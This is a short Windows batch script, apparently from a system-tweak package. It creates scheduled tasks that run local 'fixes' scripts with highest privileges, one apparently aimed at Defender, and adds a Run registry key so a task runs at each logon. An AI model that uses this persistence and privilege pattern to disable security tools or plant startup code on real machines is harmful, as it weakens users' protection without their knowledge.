@echo off
schtasks /create /sc once /tn cmd_a /tr %SYSTEMDRIVE%\fixes\ddefender\run.cmd /rl highest /st 00:00
schtasks /create /sc once /tn cmd_b /tr %SYSTEMDRIVE%\fixes\base\run.cmd /rl highest /st 00:00
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "app-fix" /t REG_SZ /d "schtasks /run /tn cmd_b" /f
schtasks /run /tn cmd_a
